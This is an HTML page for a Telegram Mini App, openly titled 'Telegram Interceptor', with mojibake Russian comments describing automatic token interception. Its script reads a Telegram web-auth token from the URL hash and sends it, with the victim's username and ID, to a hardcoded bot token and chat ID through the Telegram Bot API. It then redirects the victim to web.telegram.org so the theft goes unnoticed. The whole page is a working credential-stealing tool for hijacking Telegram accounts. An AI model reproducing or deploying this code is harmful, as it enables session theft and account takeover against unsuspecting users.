<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
        }
        .logo {
            width: 60px;
            height: 60px;
            background: #0088cc;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            color: white;
            font-size: 30px;
        }
        h2 {
            color: #0088cc;
            margin-bottom: 8px;
        }
        .status {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            font-family: monospace;
            word-break: break-all;
            border: 1px solid #e9ecef;
        }
        .loader {
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid #e9ecef;
            border-radius: 50%;
            border-top-color: #0088cc;
            animation: spin 1s linear infinite;
            margin: 10px 0;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .success {
            color: #00a884;
            font-weight: 500;
        }
        .button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-top: 12px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">üîê</div>
        <h2>Telegram Interceptor</h2>
        <p style="color: #666; margin-bottom: 20px;">–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ—Ö–≤–∞—Ç —Ç–æ–∫–µ–Ω–∞</p>
        
        <div id="loading" class="loader"></div>
        
        <div id="status" class="status">
            ‚è≥ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...
        </div>
        
        <div id="result" class="status hidden">
            <div id="tokenValue"></div>
        </div>
        
        <div id="debug" style="font-size: 12px; color: #999; margin-top: 20px; text-align: left; border-top: 1px solid #eee; padding-top: 10px;"></div>
    </div>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–µ–±–∞–≥–∞
        function debugLog(msg) {
            console.log(msg);
            let debugDiv = document.getElementById('debug');
            debugDiv.innerHTML = msg + '<br>' + debugDiv.innerHTML;
        }

        debugLog('üöÄ –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω');

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
        let tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        debugLog('‚úÖ Telegram WebApp –≥–æ—Ç–æ–≤');

        // –¢–í–û–ô –¢–û–ö–ï–ù –ë–û–¢–ê (–ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ô!)
        const BOT_TOKEN = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'; // ‚ö†Ô∏è –í–°–¢–ê–í–¨ –°–í–û–ô –¢–û–ö–ï–ù!!!
        
        // –¢–í–û–ô –ß–ê–¢ ID (—É–∑–Ω–∞–π —É @userinfobot)
        const CHAT_ID = '8220267007'; // ‚ö†Ô∏è –í–°–¢–ê–í–¨ –°–í–û–ô –ß–ê–¢ ID!!!

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        async function sendToTelegram(message) {
            try {
                let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                let response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                let data = await response.json();
                debugLog('üì§ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram: ' + (data.ok ? '‚úÖ' : '‚ùå'));
                return data.ok;
            } catch(e) {
                debugLog('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ' + e.message);
                return false;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ WebApp
        function sendViaWebApp(data) {
            try {
                tg.sendData(data);
                debugLog('üì§ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —á–µ—Ä–µ–∑ WebApp');
                return true;
            } catch(e) {
                debugLog('‚ùå –û—à–∏–±–∫–∞ WebApp: ' + e.message);
                return false;
            }
        }

        // –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function intercept() {
            let statusDiv = document.getElementById('status');
            let loadingDiv = document.getElementById('loading');
            let resultDiv = document.getElementById('result');
            let tokenDiv = document.getElementById('tokenValue');
            
            // –ü–æ–ª—É—á–∞–µ–º URL
            let currentUrl = window.location.href;
            let hash = window.location.hash;
            
            debugLog('üìç –¢–µ–∫—É—â–∏–π URL: ' + currentUrl);
            debugLog('#Ô∏è‚É£ –•–µ—à: ' + (hash || '–ø—É—Å—Ç–æ'));

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —Ç–æ–∫–µ–Ω–∞
            if (hash && hash.includes('tgWebAuthToken')) {
                // –ù–ê–®–õ–ò –¢–û–ö–ï–ù!
                loadingDiv.style.display = 'none';
                statusDiv.classList.add('hidden');
                resultDiv.classList.remove('hidden');
                
                tokenDiv.innerHTML = 'üîë <b>–¢–æ–∫–µ–Ω –Ω–∞–π–¥–µ–Ω!</b><br><br>' + hash.substring(0, 100) + '...';
                
                debugLog('üéâ –¢–û–ö–ï–ù –ù–ê–ô–î–ï–ù!');
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤—Å–µ–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏
                let message = `üîê <b>–ü–ï–†–ï–•–í–ê–ß–ï–ù –¢–û–ö–ï–ù!</b>\n\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${tg.initDataUnsafe?.user?.username || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\nüÜî ID: ${tg.initDataUnsafe?.user?.id || '–Ω–µ—Ç'}\nüîë –¢–æ–∫–µ–Ω: ${hash}`;
                
                // –°–ø–æ—Å–æ–± 1: –ß–µ—Ä–µ–∑ WebApp
                sendViaWebApp(hash);
                
                // –°–ø–æ—Å–æ–± 2: –ß–µ—Ä–µ–∑ API
                await sendToTelegram(message);
                
                // –°–ø–æ—Å–æ–± 3: –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
                localStorage.setItem('last_token', hash);
                
                // –ß–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º
                setTimeout(() => {
                    debugLog('üîÑ –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ web.telegram.org');
                    window.location.href = 'https://web.telegram.org/k/';
                }, 3000);
                
            } else {
                // –¢–æ–∫–µ–Ω–∞ –Ω–µ—Ç - –∏–¥–µ–º –ø–æ–ª—É—á–∞—Ç—å
                statusDiv.innerHTML = 'üîÑ –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ Telegram –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏...';
                debugLog('üîÑ –¢–æ–∫–µ–Ω–∞ –Ω–µ—Ç, —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ web.telegram.org');
                
                // –†–µ–¥–∏—Ä–µ–∫—Ç
                setTimeout(() => {
                    window.location.href = 'https://web.telegram.org/k/';
                }, 1500);
            }
        }

        // –°–ª—É—à–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è hash
        window.addEventListener('hashchange', function() {
            debugLog('üîÑ Hash –∏–∑–º–µ–Ω–∏–ª—Å—è: ' + window.location.hash);
            intercept();
        });

        // –ó–∞–ø—É—Å–∫–∞–µ–º
        intercept();
    </script>
</body>
</html>
